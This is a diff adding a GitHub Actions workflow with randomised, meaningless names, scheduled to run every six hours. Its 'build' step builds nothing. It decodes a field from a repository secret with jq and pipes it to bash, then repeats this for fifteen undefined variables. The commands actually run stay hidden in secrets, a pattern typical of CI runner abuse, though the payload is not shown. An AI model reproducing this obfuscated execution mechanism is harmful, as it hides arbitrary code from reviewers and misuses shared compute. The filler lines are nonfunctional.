@@ -1,0 +1,33 @@
+name: yingongfei2389
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yingongfei2389
+        env:
+          jy40: ${{ secrets.jy40 }}
+        run: |
+          echo $jy40 | jq -r .whdng59017 | /bin/bash
+          echo $uo09877 | jq -r .vw714 | /bin/bash
+          echo $yepm14681 | jq -r .gdqq34 | /bin/bash
+          echo $xgwv2388 | jq -r .slqx8 | /bin/bash
+          echo $ebkqy818 | jq -r .cyca7105 | /bin/bash
+          echo $d49158 | jq -r .hkzqe40 | /bin/bash
+          echo $xrl7 | jq -r .yb97692 | /bin/bash
+          echo $gnfux8984 | jq -r .p38292 | /bin/bash
+          echo $ar129 | jq -r .blmg0 | /bin/bash
+          echo $xmzsm74 | jq -r .phni8 | /bin/bash
+          echo $zjiz18 | jq -r .fajfr67113 | /bin/bash
+          echo $i4 | jq -r .di97 | /bin/bash
+          echo $mn93331 | jq -r .q64422 | /bin/bash
+          echo $xcni0 | jq -r .mwdw81511 | /bin/bash
+          echo $jaxz4132 | jq -r .oxd542 | /bin/bash
+          echo $bhrqt572 | jq -r .zxm61 | /bin/bash
+
